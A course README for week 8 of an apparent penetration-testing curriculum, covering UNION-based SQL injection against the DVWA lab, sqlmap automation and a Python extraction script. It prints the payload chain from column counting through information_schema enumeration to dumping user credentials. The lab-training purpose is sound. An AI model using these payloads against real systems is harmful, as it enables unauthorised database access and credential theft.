# Week 8: UNION-Based SQLi Deep Dive, SQLmap, and Python Automation

> **From Manual Exploitation to Automated Extraction — Knowing When to Use Each**

---

## Topics Covered This Week

### SQLi: UNION-Based Table Enumeration
Full schema extraction from DVWA — tables, columns, and credentials — using UNION-based injection methodology.

**Environment:** DVWA (Security: Low) — continuation from Week 7
**Database:** MySQL / MariaDB
**Approach:** 100% manual payloads before automation

### SQLmap on DVWA
Automated SQL injection scanning and data extraction using the industry-standard tool.

**Purpose:** Understand what automation provides and what it costs (noise, detection)

### Python: HTTP Automation with `requests` Library
Custom exploitation script that sends SQLi payloads programmatically, handles session cookies, and parses HTML responses with regex.

---

## Learning Objectives

**By end of Week 8, you will:**
- ✅ Execute the complete UNION-based extraction chain: column count → column positions → table names → column names → data
- ✅ Use `information_schema` systematically to map database structure
- ✅ Run sqlmap with session cookie authentication against DVWA
- ✅ Understand sqlmap injection type detection (UNION, Boolean, Time-based)
- ✅ Write a Python `requests` script that automates HTTP-based exploitation
- ✅ Parse HTML responses programmatically using `re` (regular expressions)
- ✅ Articulate when manual exploitation is preferable over automation and vice versa

---

## The Core Principle: Manual First, Automate Second

This week deliberately follows a specific order:

```
Week 7: Manual UNION exploitation
         ↓
Week 8 Step 1: Extend manual skills (table enumeration)
         ↓
Week 8 Step 2: Automate with sqlmap (fast, noisy)
         ↓
Week 8 Step 3: Custom Python script (targeted, controlled noise)
```

**Why this order matters:**

Operators who jump straight to sqlmap cannot:
- Explain findings under client questioning
- Bypass WAFs that block sqlmap signatures
- Write custom scripts for edge cases
- Identify false positives in automated output

Operators who do manual first can do all of the above, then layer automation on top for efficiency.

---

## Attack Chain This Week

```
[Manual: Column Count]
' ORDER BY 2 (ok) → ' ORDER BY 3 (error) = 2 columns
         ↓
[Manual: Column Position]
' UNION SELECT NULL, NULL = validates column count
         ↓
[Manual: DB Recon]
' UNION SELECT null, table_name FROM information_schema.tables
WHERE table_schema=database() = guestbook, users
         ↓
[Manual: Schema Mapping]
' UNION SELECT null, column_name FROM information_schema.columns
WHERE table_name='users' = user_id, user, password...
         ↓
[Manual: Credential Extraction]
' UNION SELECT user, password FROM users = 5 credential pairs
         ↓
[SQLmap: Automated Verification]
Confirms injection type, maps same structure, dumps same data
         ↓
[Python: Targeted Automation]
3-stage script: tables → columns → credentials
Controlled noise: 3 requests total vs sqlmap's 500+
```

---

## Files This Week

```
week-08/
├── README.md                             (this file)
├── 01-write-up.md                        (6-part framework)
├── 02-union-sqli-table-enumeration.md    (complete UNION methodology walkthrough)
├── 03-sqlmap-analysis.md                 (sqlmap usage, output analysis, stealth comparison)
├── 04-dvwa-sqli-extractor.py             (Python automation script — verified)
├── 05-lab-guide.md                       (step-by-step exercises)
└── 06-resources.md                       (references and tools)
```

---

**Status:** Week 8 | UNION SQLi + SQLmap + Python Automation | Complete
